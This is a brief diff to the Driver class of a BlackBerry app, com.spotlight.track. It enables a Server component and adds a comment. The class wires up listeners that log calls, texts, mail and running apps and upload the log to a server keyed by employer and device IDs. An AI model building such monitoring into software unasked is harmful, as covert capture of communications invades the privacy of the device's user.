@@ -8,6 +8,7 @@
 
 package com.spotlight.track;
 
+import com.kids.prototypes.Debug;
 import com.kids.prototypes.LocalDataReader;
 import net.rim.device.api.system.Application;
  
@@ -78,13 +79,14 @@ public class Driver extends Application
         int AppTimer    =  2*oneSec;//check running app every
         
         // Load sub-components
+        // What type should actLog be?
         new MyServerUpload(actLog, employerID, deviceID, uploadTimer);
     	new MyCallListener(actLog);
 	    new MyTextListener(actLog);
 	    new MyMailListener(actLog);
 	    //new MyGPSListener (actLog, GPSTimer);
 	    new MyAppListener (actLog, AppTimer);	     
-	    //new Server(actLog);
+	    new Server(actLog);
         
         
         /*synchronized(Application.getEventLock()){    UiEngine ui = Ui.getUiEngine();
